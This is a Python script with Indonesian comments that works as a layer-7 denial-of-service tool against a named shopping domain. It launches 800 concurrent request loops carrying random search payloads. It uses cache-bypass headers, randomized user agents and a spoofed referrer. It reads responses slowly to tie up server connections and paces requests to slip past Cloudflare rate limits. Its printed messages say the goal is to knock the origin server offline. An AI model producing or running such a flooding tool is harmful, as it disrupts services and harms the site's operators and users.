
import asyncio
import aiohttp
import random
import string

TARGET_BASE = "https://inihari88.shop/"

def get_random_str(length=25):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def cloud_cracker(session):
    while True:
        try:
            # Gunakan payload yang memaksa MySQL melakukan pencarian regex/wildcard
            # Ini jauh lebih berat daripada pencarian biasa
            payload = get_random_str(30)
            url = f"{TARGET_BASE}?s={payload}&cat={random.randint(1,999)}" 
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.random()}",
                "Accept": "text/html,application/xhtml+xml,xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "https://www.google.com/",
                # Bypass cache dengan header ini
                "Cache-Control": "no-store, no-cache, must-revalidate",
                "Pragma": "no-cache",
                "X-Requested-With": "XMLHttpRequest" 
            }

            async with session.get(url, headers=headers, timeout=20) as r:
                # KUNCINYA: Baca data perlahan untuk menahan slot koneksi di server origin
                content = await r.content.read(50) 
                print(f"[🔥] Cracking Origin... | Status: {r.status} | Payload: {payload[:10]}")
                
                # Jeda sedikit biar gak langsung di-ban IP-mu oleh Cloudflare (Rate Limiting)
                # Tapi tetap cukup berat buat bikin server origin "sesak napas"
                await asyncio.sleep(0.2) 
        except Exception:
            await asyncio.sleep(1)

async def main():
    print(f"🚀 MENGAKTIFKAN THE CLOUD-CRACKER PADA: {TARGET_BASE} 🚀")
    print("Mode: Anti-Cache & Resource Exhaustion")
    
    # Gunakan limit koneksi yang masuk akal tapi mematikan (misal 500-1000)
    # Daripada 5000 tapi cuma dapet 429 terus
    connector = aiohttp.TCPConnector(limit=800, ssl=False, ttl_dns_cache=600)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [cloud_cracker(session) for _ in range(800)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Dihentikan. Cek apakah Origin Server sudah KO.")
